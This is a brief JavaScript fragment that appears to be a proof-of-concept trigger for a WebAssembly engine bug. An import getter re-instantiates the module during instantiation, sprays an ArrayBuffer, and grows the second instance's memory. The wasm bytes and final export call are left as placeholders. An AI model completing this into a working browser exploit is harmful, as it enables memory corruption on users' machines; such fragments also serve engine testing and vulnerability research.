// raw_wasm = ...
var mod = WebAssembly.Module(raw_wasm);
var ffi = {
  mod: {
    get imp() {
      wasm2 = WebAssembly.Instance(mod, {mod: {imp: function(){}}});
      spacer = new ArrayBuffer(0x10000);
      return function() {};
    }
  }
};
wasm = WebAssembly.Instance(mod, ffi);
wasm2.exports.memory.grow(1);
// wasm.exports.XXX
